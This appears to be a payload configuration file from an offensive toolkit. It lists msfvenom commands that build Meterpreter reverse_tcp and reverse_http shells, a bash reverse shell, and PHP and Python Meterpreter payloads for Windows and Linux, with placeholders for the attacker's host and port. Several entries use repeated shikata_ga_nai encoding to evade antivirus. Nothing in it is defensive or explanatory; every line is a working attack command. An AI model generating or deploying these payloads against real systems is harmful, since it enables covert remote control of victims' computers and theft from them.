payloads.name: shellcode_x86
payloads.generate: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f raw > shellcode_x86.bin

payloads.name: exe_x86
payloads.generate: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe > payload_x86.exe

payloads.name: vbs_x86
payloads.generate: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f vbs > payload_x86.vbs

payloads.name: powershell_x86
payloads.generate: msfvenom -p windows/meterpreter/reverse_http LHOST=<host> LPORT=<port> -f psh > payload_x86.ps1

payloads.name: powershell_x64
payloads.generate: msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<host> LPORT=<port> -f psh > payload_x64.ps1

payloads.name: elf_x86
payloads.generate: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f elf > payload_x86.elf

payloads.name: bash
payloads.generate: msfvenom -p cmd/unix/reverse_bash LHOST=<host> LPORT=<port> -f raw > payload.sh

payloads.name: php
payloads.generate: msfvenom -p php/meterpreter_reverse_tcp LHOST=<host> LPORT=<port> -f raw > payload.php

payloads.name: python
payloads.generate: msfvenom -p python/meterpreter_reverse_tcp LHOST=<host> LPORT=<port> -f raw > payload.py
